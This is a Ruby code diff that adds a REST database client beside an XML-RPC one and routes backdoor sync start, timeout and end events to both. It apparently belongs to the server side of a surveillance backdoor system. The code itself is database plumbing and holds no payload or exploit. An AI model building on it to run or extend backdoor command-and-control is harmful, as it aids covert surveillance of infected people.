@@ -5,6 +5,7 @@
 # relatives
 require_relative 'config.rb'
 require_relative 'db_xmlrpc.rb'
+require_relative 'db_rest.rb'
 require_relative 'db_cache.rb'
 
 # from RCS::Common
@@ -36,6 +37,7 @@ class DB
   def initialize
     # database address
     @host = Config.global['DB_ADDRESS'].to_s + ":" + Config.global['DB_PORT'].to_s
+    @host_xmlrpc = Config.global['DB_ADDRESS'].to_s + ":" + (Config.global['DB_PORT'] - 1).to_s
 
     # the username is an unique identifier for each machine.
     # we use the MD5 of the MAC address
@@ -56,14 +58,16 @@ class DB
     
     # the current db layer to be used is the XML-RPC protocol
     # this will be replaced by DB_rest
-    @db = DB_xmlrpc.new @host
-
+    @db = DB_xmlrpc.new @host_xmlrpc
+    @db_rest = DB_rest.new @host
+    
     return @available
   end
 
   def connect!
     trace :info, "Checking the DB connection [#{@host}]..."
-    if @db.login @username, @password then
+    # during the transition we log in to both xml-rpc and rest interfaces
+    if @db.login(@username, @password) and @db_rest.login(@username, @password) then
       @available = true
       trace :info, "Connected to [#{@host}]"
     else
@@ -101,6 +105,15 @@ class DB
   def db_call(method, *args)
     begin
       return @db.send method, *args
+    rescue
+      self.connected = false
+      return nil
+    end
+  end
+
+  def db_rest_call(method, *args)
+    begin
+      return @db_rest.send method, *args
     rescue
       self.connected = false
       return nil
@@ -215,20 +228,21 @@ class DB
 
     # tell the db that the backdoor has synchronized
     db_call :sync_start, bid, version, user, device, source, time
+    db_rest_call :sync_start, bid, version, user, device, source, time
   end
 
   def sync_timeout(bid)
     # database is down, continue
     return unless @available
 
-    #TODO: implement me in rest
+    db_rest_call :sync_timeout, bid
   end
 
   def sync_end(bid)
     # database is down, continue
     return unless @available
 
-    #TODO: implement me in rest
+    db_rest_call :sync_end, bid
   end
 
   def new_conf?(bid)
